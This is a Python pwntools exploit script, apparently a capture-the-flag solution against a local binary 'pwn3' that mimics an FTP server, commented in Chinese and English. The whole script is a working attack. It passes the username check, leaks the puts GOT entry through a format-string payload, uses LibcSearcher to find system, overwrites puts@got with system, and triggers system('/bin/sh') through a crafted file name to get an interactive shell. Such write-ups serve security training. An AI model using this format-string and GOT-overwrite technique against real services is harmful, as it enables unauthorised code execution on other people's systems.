from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'debug'
pwn3 = ELF('./pwn3')
sh = process('./pwn3')
name = ""
for i in "sysbdmin":
    name += chr(ord(i) - 1)  # 通过IDA分析得到的正确的用户名 # rxraclhm
sh.recvuntil('Name (ftp.hacker.server:Rainism):')
sh.sendline(name)  # send name # 用计算得出的正确用户名，通过一开始的用户名校验
# .got.plt:0804A028 off_804A028     dd offset puts          ; DATA XREF: _puts↑r
puts_got = pwn3.got['puts']  # get the addr of puts # 获取 puts 函数的got表项地址
log.success('puts got : ' + hex(puts_got))  # log

gdb.attach(sh)  # gdb attach

# ====== step 1: put ====== # put file name 111, content b"%8$s" + p32(puts_got)
sh.sendline('put')
sh.recvuntil('please enter the name of the file you want to upload:')
sh.sendline('1111')
sh.recvuntil('then, enter the content:')
sh.sendline(b"%8$s" + p32(puts_got))
# ====== step 2: get ====== # get 1111, got actual addr of puts
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
sh.sendline('1111')
data = sh.recv()
puts_addr = u32(data[:4])  # 获取puts函数的真实地址
# ====== step 3: system_addr ====== get addr of system using LibcSearcher
libc = LibcSearcher("puts", puts_addr)  # 根据 puts 函数的真实地址，比对得出libc的版本(一般多个)
system_offset = libc.dump('system')  # 该版 libc system 函数的偏移量
puts_offset = libc.dump('puts')  # 该版 libc puts 函数的偏移量
system_addr = system_offset - puts_offset + puts_addr  # 该版 libc system 函数的真实地址
log.success('system actual addr = ' + hex(system_addr))  # log
# ====== step 4: put ====== modify puts@got, point to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr})  # 格式化字符串的偏移是 7，希望在 puts_got 地址处写入 system_addr 地址
print("payload:", payload, "\npayload:", payload.hex())
sh.sendline('put')
sh.recvuntil('please enter the name of the file you want to upload:')
sh.sendline('/bin/sh;')  # file name
sh.recvuntil('then, enter the content:')
sh.sendline(payload)  # file content
# ====== step 5: get ======
sh.recvuntil('ftp>')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
sh.sendline('/bin/sh;')  # file name
# ====== step 6: dir ======
sh.sendline('dir')  # system('/bin/sh')
sh.interactive()
